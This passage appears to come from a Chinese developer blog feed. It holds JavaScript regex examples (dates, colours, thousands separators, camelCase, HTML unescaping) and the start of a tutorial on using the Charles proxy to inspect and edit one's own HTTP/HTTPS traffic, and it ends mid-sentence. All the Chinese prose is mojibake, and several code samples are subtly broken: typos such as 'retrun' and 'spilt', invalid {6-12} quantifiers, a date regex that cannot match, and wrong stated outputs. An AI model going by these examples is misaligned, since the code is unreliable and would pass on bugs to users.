class="regexp">/\D/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017-01-01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017.01.01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2017/01/01"</span>.split(regex));  <span class="comment">// ["2017", "01" "01"]</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-æå–"><a href="#2-3-æå–" class="headerlink" title="2.3 æå–"></a>2.3 æå–</h4><p>æå–åŒ¹é…åˆ°çš„æ•°æ®<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^(\d&#123;4&#125;)\D(\d&#123;2&#125;)\D(\d&#123;2&#125;))$/</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"2017-06-26"</span>;</span><br><span class="line">string.match(regex); </span><br><span class="line"><span class="comment">// [$0, $1, $2 ... , index, input]</span></span><br><span class="line"><span class="comment">//  =&gt;["2017-06-26", "2017", "06", "26", index: 0, input: "2017-06-26"]</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-æ›¿æ¢"><a href="#2-4-æ›¿æ¢" class="headerlink" title="2.4 æ›¿æ¢"></a>2.4 æ›¿æ¢</h4><p><code>string.replace(regex, newtext)</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†yyyy-mm-ddæ›¿æ¢æˆyyyy/mm/dd</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"2017-06-26"</span>;</span><br><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>( string.replace(<span class="regexp">/\-/g</span>, <span class="string">"/"</span>))</span><br><span class="line"><span class="built_in">console</span>.log(today)  <span class="comment">// =&gt; Mon Jun 26 2017 00:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-åŒ¹é…åŸç†"><a href="#3-åŒ¹é…åŸç†" class="headerlink" title="3. åŒ¹é…åŸç†"></a>3. åŒ¹é…åŸç†</h3><h4 id="3-1-å›æº¯"><a href="#3-1-å›æº¯" class="headerlink" title="3.1 å›æº¯"></a>3.1 å›æº¯</h4><p>åè¡¥</p><h4 id="3-2-æ“ä½œç¬¦ä¼˜å…ˆçº§"><a href="#3-2-æ“ä½œç¬¦ä¼˜å…ˆçº§" class="headerlink" title="3.2 æ“ä½œç¬¦ä¼˜å…ˆçº§"></a>3.2 æ“ä½œç¬¦ä¼˜å…ˆçº§</h4><p>ä¼˜å…ˆçº§ä»ä¸Šè‡³ä¸‹ï¼Œç”±é«˜åˆ°ä½</p><ul><li>è½¬ä¹‰ç¬¦ \</li><li>æ‹¬å·å’Œæ–¹æ‹¬å· (â€¦)ã€(?:â€¦)ã€(?=â€¦)ã€(?!â€¦)ã€[â€¦]</li><li>é‡è¯é™å®šç¬¦ {m}ã€{m,n}ã€{m,}ã€?ã€*ã€+</li><li>ä½ç½®å’Œåºåˆ— ^ ã€$ã€ \å…ƒå­—ç¬¦ã€ ä¸€èˆ¬å­—ç¬¦</li><li>ç®¡é“ç¬¦ï¼ˆç«–æ ï¼‰|</li></ul><h4 id="3-3-ä¼˜åŒ–æ•ˆç‡"><a href="#3-3-ä¼˜åŒ–æ•ˆç‡" class="headerlink" title="3.3 ä¼˜åŒ–æ•ˆç‡"></a>3.3 ä¼˜åŒ–æ•ˆç‡</h4><p>åè¡¥</p><p><br></p><h3 id="4-ä¾‹å­"><a href="#4-ä¾‹å­" class="headerlink" title="4. ä¾‹å­"></a>4. ä¾‹å­</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/hello/</span>;</span><br><span class="line">regex.test(<span class="string">"hello"</span>);  </span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/ab&#123;1,2&#125;c/g</span>;</span><br><span class="line"><span class="string">"abc abbc abbbc"</span>.match(regex); </span><br><span class="line"><span class="comment">// ["abc", "abbc"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/a[123]b/g</span>;</span><br><span class="line"><span class="string">"a0b a1b a4b"</span>.match(regex); </span><br><span class="line"><span class="comment">// ["a1b"];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¹é…2-3ä½æ•°</span></span><br><span class="line"><span class="comment">// ç­›é€‰æ•°ç»„ä¸­çš„ä¸‰ä½æ•° arr.join(" ").match(/d&#123;3&#125;/g)</span></span><br><span class="line"><span class="comment">// è´ªå©ªåŒ¹é…ï¼Œå°½å¯èƒ½å¤šçš„åŒ¹é…</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;2,5&#125;/g</span>;</span><br><span class="line"><span class="string">"123 1234 12356 123456"</span>.match(regex);  </span><br><span class="line"><span class="comment">// ["123", "1234", "1234", "12345"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æƒ°æ€§åŒ¹é…ï¼Œå°½å¯èƒ½å°‘çš„åŒ¹é…</span></span><br><span class="line"><span class="comment">// åœ¨é‡è¯åé¢åŠ ä¸ªé—®å·èƒ½å®ç°æƒ°æ€§åŒ¹é… &#123;m,n&#125;?   &#123;m,&#125;?   ??   +?  *?  </span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;2,3&#125;?/g</span></span><br><span class="line"><span class="string">"123 1234 12356 123456"</span>.match(regex);  </span><br><span class="line"><span class="comment">// ["12", "12", "34", "12", "34", "12", "34", "56"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// (p1|p2|p3)åˆ†æ”¯ç»“æ„æ˜¯æƒ°æ€§çš„ï¼Œå‰é¢çš„åŒ¹é…ä¸Šäº†ï¼Œåé¢çš„å°±ä¸å†å°è¯•</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/good|goodbye/g</span>;   <span class="comment">// ["good"]</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/goodbye|good/g</span>;   <span class="comment">// ["goodbye"]</span></span><br><span class="line"><span class="string">"goodbye"</span>.match(regex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¹é…16è¿›åˆ¶é¢œè‰²å€¼, [0-9a-fA-F]å‡ºç°3æˆ–6æ¬¡</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/#([0-9a-fA-F]&#123;3&#125;|[0-9a-fA-F]&#123;6&#125;)/g</span>;;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">"#ffbbad #FC01df #fff"</span>;  </span><br><span class="line"><span class="comment">// ["#ffbbad","#FC01df","#fff"]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¹é…æ—¶é—´</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^([01][0-9]|[2][0-3]):([0-5][0-9])$/</span>;</span><br><span class="line">regex.test(<span class="string">"23:59"</span>)</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¹é…æ—¥æœŸ</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/</span></span><br><span class="line">regex.test(<span class="string">"2019-01-02"</span>);</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠyyyy-mm-ddæ ¼å¼æ›¿æ¢æˆmm/dd/yyyy</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/(\d&#123;2&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)/</span>;</span><br><span class="line"><span class="string">"2019-01-02"</span>.replace(regex, <span class="string">"$2/$3/$1"</span>);</span><br><span class="line"><span class="comment">// "01/02/2019"ï¼Œ ç­‰ä»·äº</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="string">"2019-01-02"</span>.replace(regex, <span class="function"><span class="keyword">function</span>(<span class="params">match, year, month, day</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> month + <span class="string">"/"</span> + day + <span class="string">"/"</span> + year;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¹é…2016-01-02 2016/01/01 2016.01.02ä¸‰ç§æ ¼å¼ï¼Œç¡®ä¿å‰ååˆ†éš”ç¬¦ä¸€è‡´</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/\d&#123;4&#125;(-|/</span>|.)\d&#123;<span class="number">2</span>&#125;\<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;/;</span><br><span class="line">regex.test(string);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¹é…windowsæ“ä½œç³»ç»Ÿæ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[a-zA-Z]:\\([^\\:*&lt;&gt;|"?\r\n/]+\\)*([^\\:*&lt;&gt;|"?\r\n/]+)?$/</span>;</span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript\\regex\\regular expression.pdf"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript\\regex\\"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\study\\javascript"</span>) ); </span><br><span class="line"><span class="built_in">console</span>.log( regex.test(<span class="string">"F:\\"</span>) ); </span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¹é…idå€¼</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/id=".*"/</span>;      <span class="comment">// id="container" class="main"</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/id="[^"]*"/</span>;   <span class="comment">// id="container"</span></span><br><span class="line"><span class="keyword">var</span> string = <span class="string">'&lt;div id="container" class="main"&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•°å­—åƒåˆ†ä½åˆ†éš”ç¬¦</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/(?!^)(?=(\d&#123;3&#125;)+$)/</span>;</span><br><span class="line"><span class="string">"12345678"</span>.replace(regex, <span class="string">','</span>)  <span class="comment">// 12,345,678</span></span><br><span class="line"><span class="string">"123456789"</span>.replace(regex, <span class="string">','</span>) <span class="comment">// 123,456,789</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯†ç  6-12ä½ å¤šé‡è§„åˆ™åº”æ‹†å¼€å†™</span></span><br><span class="line"><span class="comment">// 1. åŒæ—¶åŒ…å«æ•°å­—å’Œå°å†™å­—æ¯ </span></span><br><span class="line"><span class="comment">// 2. åŒæ—¶åŒ…å«æ•°å­—å’Œå¤§å†™å­—æ¯ </span></span><br><span class="line"><span class="comment">// 3. åŒæ—¶åŒ…å«å°å†™å­—æ¯å’Œå¤§å†™å­—æ¯ </span></span><br><span class="line"><span class="comment">// 4. åŒæ—¶åŒ…å«æ•°å­—ã€å°å†™å­—æ¯å’Œå¤§å†™å­—æ¯</span></span><br><span class="line"><span class="keyword">var</span> regex1 = <span class="regexp">/^[0-9a-z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex2 = <span class="regexp">/^[0-9A-Z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex3 = <span class="regexp">/^[a-zA-Z]&#123;6-12&#125;$/</span></span><br><span class="line"><span class="keyword">var</span> regex4 = <span class="regexp">/^[0-9a-zA-Z]&#123;6-12&#125;$/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¹é…æµ®ç‚¹æ•°</span></span><br><span class="line"><span class="comment">// 10  +10  -10  1.23  +1.23  -1.23  .2  +.2  -.2</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[+-]?(\d+|\d+\.\d+|.\d+)$/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å­—ç¬¦ä¸²trimæ¨¡æ‹Ÿ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†æ¯ä¸ªå•è¯çš„é¦–å­—æ¯è½¬ä¸ºå¤§å†™</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">titleize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  retrun str.toLowerCase().replace(<span class="regexp">/(?:^|\s)\w/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c.toUpperCase();</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">titleize(<span class="string">"my name is amy"</span>)   <span class="comment">// "My Name Is Amy"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// é©¼å³°åŒ– </span></span><br><span class="line"><span class="comment">// ?çš„ç›®çš„ï¼Œä¸ºäº†åº”å¯¹strå°¾éƒ¨çš„å­—ç¬¦å¯èƒ½ä¸æ˜¯å•è¯å­—ç¬¦ "-moz-transform  "</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">camelize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/[-_\s]+(.)?/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">match, c</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c ? c.toUpperCase() : <span class="string">''</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸­åˆ’çº¿åŒ–</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dasherize</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/([A-Z])/g</span>, <span class="string">'-$1'</span>).replace(<span class="regexp">/[-_/s]+/g</span>, <span class="string">'-'</span>).toLowerCase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// htmlè½¬ä¹‰å’Œåè½¬ä¹‰</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unescapeHTML</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> htmlEntities = &#123;</span><br><span class="line">    lt: <span class="string">'&lt;'</span>,</span><br><span class="line">  gt: <span class="string">'&gt;'</span>,</span><br><span class="line">  nbsp: <span class="string">' '</span>,</span><br><span class="line">  cent: <span class="string">'Â¢'</span>,</span><br><span class="line">  pound: <span class="string">'Â£'</span>,</span><br><span class="line">  yen: <span class="string">'Â¥'</span>,</span><br><span class="line">  euro: <span class="string">'â‚¬'</span>,</span><br><span class="line">  copy: <span class="string">'Â©'</span>,</span><br><span class="line">  reg: <span class="string">'Â®'</span>,</span><br><span class="line">  quot: <span class="string">'"'</span>,</span><br><span class="line">  amp: <span class="string">'&amp;'</span>,</span><br><span class="line">  apos: <span class="string">'\''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/\(&amp;[^;]+);/</span>, <span class="function"><span class="keyword">function</span>(<span class="params">match, key</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (key <span class="keyword">in</span> htmlEntities) &#123;</span><br><span class="line">      <span class="keyword">return</span> htmlEntities[key]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> match;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">unescapeHTML(<span class="string">'&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt'</span>); <span class="comment">// "&lt;div&gt;Blah blah blah&lt;/div&gt;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¦åˆ æˆå¯¹æ ‡ç­¾ æ ¼å¼</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/&lt;([^&gt;]+)&gt;[\d\D]*&lt;\/\1&gt;/</span>; </span><br><span class="line">regex.test(<span class="string">"&lt;title&gt;wrong!&lt;/p&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿è¯åªæœ‰ä¸­æ–‡</span></span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/^[\u4e00-\u9fa5]+$/ig</span>;</span><br><span class="line">regex.test(<span class="string">'ä¸­æ–‡'</span>) <span class="comment">// true</span></span><br><span class="line">regex.test(<span class="string">'ä¸­a'</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-æ²¡æœ‰å¿…è¦ç”¨æ­£åˆ™çš„æƒ…å†µ"><a href="#5-æ²¡æœ‰å¿…è¦ç”¨æ­£åˆ™çš„æƒ…å†µ" class="headerlink" title="5. æ²¡æœ‰å¿…è¦ç”¨æ­£åˆ™çš„æƒ…å†µ"></a>5. æ²¡æœ‰å¿…è¦ç”¨æ­£åˆ™çš„æƒ…å†µ</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»æ—¥æœŸä¸­æå–å¹´æœˆæ—¥</span></span><br><span class="line"><span class="string">"2017-01-02"</span>.spilt(<span class="string">'-'</span>)   <span class="comment">// ["2017", "01", "02"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ¤æ–­æ˜¯å¦æœ‰é—®å·</span></span><br><span class="line"><span class="string">"123?123"</span>.indexOf(<span class="string">'?'</span>)   <span class="comment">// 3</span></span><br><span class="line"><span class="string">"123"</span>.indexOf(<span class="string">'?'</span>)       <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å­ä¸²</span></span><br><span class="line"><span class="string">"JavaScript"</span>.substring(<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5cdcd42551882568651554e6" target="_blank" rel="noopener">æ­£åˆ™è¡¨è¾¾å¼ä¸è¦èƒŒ</a></li><li><a href="https://juejin.im/post/5965943ff265da6c30653879" target="_blank" rel="noopener">JSæ­£åˆ™è¡¨è¾¾å¼å®Œæ•´æ•™ç¨‹ï¼ˆç•¥é•¿ï¼‰</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CharlesæŠ“åŒ…</title>
      <link href="/2019/05/27/Charles%E6%8A%93%E5%8C%85/"/>
      <url>/2019/05/27/Charles%E6%8A%93%E5%8C%85/</url>
      <content type="html"><![CDATA[<blockquote><p>Charleså°†è‡ªå·±è®¾ç½®ä¸ºç³»ç»Ÿçš„ç½‘ç»œè®¿é—®ä»£ç†æœåŠ¡å™¨ï¼Œè¿™æ ·æ‰€æœ‰çš„ç½‘ç»œè¯·æ±‚éƒ½ä¼šé€šè¿‡å®ƒï¼Œä»è€Œå®ç°äº†ç½‘ç»œè¯·æ±‚çš„æˆªè·å’Œåˆ†æã€‚</p></blockquote><p><br></p><h3 id="1-è¿‡æ»¤ç½‘ç»œè¯·æ±‚"><a href="#1-è¿‡æ»¤ç½‘ç»œè¯·æ±‚" class="headerlink" title="1. è¿‡æ»¤ç½‘ç»œè¯·æ±‚"></a>1. è¿‡æ»¤ç½‘ç»œè¯·æ±‚</h3><p>é€‰æ‹©èœå•ä¸­çš„Proxy -&gt; Mac OS X Proxyï¼Œä¹‹åä½ çš„ç”µè„‘ä¸Šçš„ä»»ä½•ç½‘ç»œè¯·æ±‚éƒ½å¯ä»¥åœ¨è¯·æ±‚é¢æ¿ä¸­çœ‹åˆ°ã€‚</p><ul><li>Structure: å°†æ‰€æœ‰ç½‘ç»œè¯·æ±‚æŒ‰ç…§åŸŸååˆ’åˆ†</li><li>Sequence: å°†æ‰€æœ‰ç½‘ç»œè¯·æ±‚æŒ‰ç…§æ—¶é—´æ’åº</li><li>filter: è¿‡æ»¤ç½‘ç»œè¯·æ±‚ã€‚æƒ³çœ‹æ‰€æœ‰æ¥è‡ª<code>www.baidu.com</code>çš„æ‰€æœ‰ç½‘ç»œè¯·æ±‚ï¼Œåœ¨ä¸‹é¢ä½ è¾“å…¥baiduå³å¯ã€‚<br><br><br><img src="/2019/05/27/CharlesæŠ“åŒ…/1.png" style="max-width:500px"></li></ul><p><br><br><br></p><h3 id="2-æˆªå–httpsæ•°æ®"><a href="#2-æˆªå–httpsæ•°æ®" class="headerlink" title="2. æˆªå–httpsæ•°æ®"></a>2. æˆªå–httpsæ•°æ®</h3><p>æ•è·httpsåè®®çš„ç½‘ç»œè¯·æ±‚ï¼Œéœ€è¦å®‰è£…Charlesçš„CAè¯ä¹¦ã€‚</p><p>ç‚¹å‡»é¡¶éƒ¨èœå•æ Help -&gt; SSL Proxying -&gt; Install Charles Root Certificate -&gt; åœ¨keychainå¤„å°†æ–°å®‰è£…çš„è¯ä¹¦è®¾ç½®ä¸ºæ°¸ä¹…ä¿¡ä»»ã€‚å³ä½¿å®‰è£…äº†CAè¯ä¹¦ï¼Œcharlesé»˜è®¤æ˜¯ä¸æ•è·httpsåè®®çš„ç½‘ç»œè¯·æ±‚ã€‚æˆ‘ä»¬éœ€è¦é€‰ä¸­ç½‘ç»œè¯·æ±‚å³å‡»é€‰ä¸­ <em>SSL Proxying Enabled</em>ï¼Œè¿™æ ·æ‰èƒ½çœ‹åˆ°ã€‚<br><br><br><img src="/2019/05/27/CharlesæŠ“åŒ…/5.png" style="max-width:500px"></p><p><br><br><br></p><h3 id="3-æˆªè·iPhoneçš„ç½‘ç»œè¯·æ±‚"><a href="#3-æˆªè·iPhoneçš„ç½‘ç»œè¯·æ±‚" class="headerlink" title="3. æˆªè·iPhoneçš„ç½‘ç»œè¯·æ±‚"></a>3. æˆªè·iPhoneçš„ç½‘ç»œè¯·æ±‚</h3><p>è¦æˆªè·iphoneçš„ç½‘ç»œè¯·æ±‚éœ€è¦ä¸ºCharleså¼€å¯ä»£ç†åŠŸèƒ½ã€‚åœ¨èœå•æ é€‰æ‹©Proxy -&gt; Proxy Settingsï¼Œå¡«å†™HTTP Proxy, Port:8888ã€‚å¹¶å°†Enable transparent HTTP proxyingå‹¾é€‰ä¸Šã€‚</p><p><em>iphoneä¸Šçš„è®¾ç½®</em><br>æ‰“å¼€æ‰‹æœºâ€œè®¾ç½® - æ— çº¿å±€åŸŸç½‘â€ï¼Œç‚¹å‡»â€œé…ç½®ä»£ç†â€ï¼Œè®¾ç½®HTTPä»£ç†é€‰ä¸­â€œæ‰‹åŠ¨â€ã€‚æœåŠ¡å™¨å¤„å¡«å†™ç”µè„‘ipåœ°å€ï¼Œç«¯å£å†™8888ã€‚<br><br><br><img src="/2019/05/27/CharlesæŠ“åŒ…/2.png" style="max-width:200px"></p><p><br></p><h3 id="4-ä¿®æ”¹ç½‘ç»œè¯·æ±‚"><a href="#4-ä¿®æ”¹ç½‘ç»œè¯·æ±‚" class="headerlink" title="4. ä¿®æ”¹ç½‘ç»œè¯·æ±‚"></a>4. ä¿®æ”¹ç½‘ç»œè¯·æ±‚</h3><p>Charlesæä¾›äº†å¯¹ç½‘ç»œè¯·æ±‚çš„ç¼–è¾‘å’Œé‡å‘åŠŸèƒ½ã€‚åªè¦é€‰ä¸­éœ€è¦ä¿®æ”¹ç¼–è¾‘çš„ç½‘ç»œè¯·æ±‚ï¼Œç‚¹å‡» <em>é’¢ç¬”</em> æŒ‰é’®ï¼Œç‚¹å‡»åå°±å¯ä»¥å¯¹ç½‘ç»œè¯·æ±‚è¿›è¡Œç¼–è¾‘ï¼Œç¼–è¾‘åç‚¹å‡» <em>Execute</em> æŒ‰é’®ï¼Œè¯¥è¯·æ±‚å°±èƒ½è¢«æ‰§è¡Œã€‚<br><br><br><img src="/2019/05/27/CharlesæŠ“åŒ…/3.png" style="max-width: 500px"><br><br></p><h3 id="5-ä¿®æ”¹æœåŠ¡å™¨è¿”å›å†…å®¹"><a href="#5-ä¿®æ”¹æœåŠ¡å™¨è¿”å›å†…å®¹" class="headerlink" title="5. ä¿®æ”¹æœåŠ¡å™¨è¿”å›å†…å®¹"></a>5. ä¿®æ”¹æœåŠ¡å™¨è¿”å›å†…å®¹</h3><p>ä¸ºäº†è°ƒè¯•ä»£ç ï¼Œå¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦ä¿®æ”¹æ¥å£è¿”å›çš„æ•°æ®ã€‚åˆ¶é€ 